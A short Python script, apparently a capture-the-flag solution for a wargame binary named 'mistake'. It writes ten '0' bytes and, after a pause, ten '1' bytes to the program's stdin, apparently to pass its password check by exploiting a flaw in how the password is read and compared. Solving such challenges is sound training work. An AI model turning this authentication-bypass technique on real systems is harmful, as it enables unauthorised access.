#!/usr/bin/python3
import subprocess
import sys
import time

program = "/home/mistake/mistake"

process = subprocess.Popen(program, stdin=subprocess.PIPE)

# 0 = 0x30, which is: 0011 0000
# 1 = 0x31, which is: 0011 0001
# FINE
pw_buf = b"0" * 10

pw_buf2 = b"1" * 10
print("sends {}\n".format(pw_buf.decode()))
process.stdin.write(pw_buf)
process.stdin.flush()

time.sleep(20)

print("sends {}\n".format(pw_buf2.decode()))
process.stdin.write(pw_buf2)
process.stdin.flush()

